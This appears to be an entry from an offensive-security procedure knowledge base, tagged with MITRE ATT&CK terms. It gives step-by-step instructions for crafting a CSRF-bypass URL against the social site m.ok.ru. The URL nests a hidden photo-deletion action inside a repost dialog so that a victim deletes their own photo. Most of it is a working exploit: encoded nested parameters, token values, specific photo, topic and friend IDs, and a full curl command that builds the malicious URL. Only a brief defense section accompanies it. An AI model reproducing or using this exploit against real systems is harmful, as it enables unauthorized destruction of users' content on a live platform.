---
id: p-craft-malicious-url
tags:
  - csrf
  - url-crafting
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/craft-csrf-bypass-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:15.583Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious URL with Embedded Photo Deletion

## Summary

This procedure crafts a malicious URL exploiting the st.rtu parameter in m.ok.ru to embed an unauthorized photo deletion action within a repost context, bypassing CSRF protections.

## Description

Using the /dk endpoint, the URL starts with a benign repost command (st.cmd=friendReshareTopic) and nests the malicious payload in st.rtu, including st.actions JSON for {"photos.delete":{"photoId":"812501293868","groupId":null}}. The X-XTKN token is included to authenticate the AJAX request. This allows execution when the victim interacts with the dialog. Prerequisites: Knowledge of target photoId, topicId, and friendId from reconnaissance.

## Requirements

1. Target identifiers: photoId (e.g., 812501293868), topicId (e.g., 64607766975788), friendId (e.g., 584798454828)
2. URL encoding tool or curl for crafting
3. Valid tkn values from observed requests

## Defense

Defensive measures and detection strategies:

- Validate all nested parameters like st.rtu against CSRF tokens
- Sanitize and decode URL parameters server-side
- Log and alert on unusual st.rtu lengths or JSON payloads

## Objectives

1. Embed deletion action without triggering CSRF
2. Ensure payload executes on dialog interaction
3. Test URL in a controlled environment

## Instructions

### Step 1: Encode Nested Payload

**Context**: Build the inner st.rtu for photo deletion.

Prepare the nested string: /dk?st.cmd=userPhoto&st.phoId=812501293868&st.layer=soon&_prevCmd=userPhoto&tkn=2696&st.actions={"photos.delete":{"photoId":"812501293868","groupId":null}}

> URL-encode this for embedding.

### Step 2: Construct Full URL

**Context**: Wrap in repost context using [[commands/craft-csrf-bypass-url]].

**Command** ([[commands/craft-csrf-bypass-url]]):
```bash
curl -G "http://m.ok.ru/dk" \
  --data-urlencode "st.cmd=friendReshareTopic" \
  --data-urlencode "st.topicId=64607766975788" \
  --data-urlencode "st.rtu=/dk?bk=ActionBus&st.cmd=actionBus&st.rtu=%2Fdk%3Fst.cmd%3DuserPhoto%26st.phoId%3D812501293868%26st.layer%3Dsoon%26_prevCmd%3DuserPhoto%26tkn%3D2696%26_prevCmd%3DuserPhoto%26tkn%3D6230%26st.actions%3D%7B%22photos.delete%22%3A%7B%22photoId%22%3A%22812501293868%22%2C%22groupId%22%3Anull%7D%7D%26_i_loc_rdr%3D1" \
  --data-urlencode "st.friendId=584798454828" \
  --data-urlencode "_prevCmd=friendMediaStatusComments" \
  --data-urlencode "tkn=7824"
```

> This generates the full malicious URL. Copy the Location header or response for use.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/craft-csrf-bypass-url]]

## Tools Used


## Tags

- [[csrf]]
- [[web]]
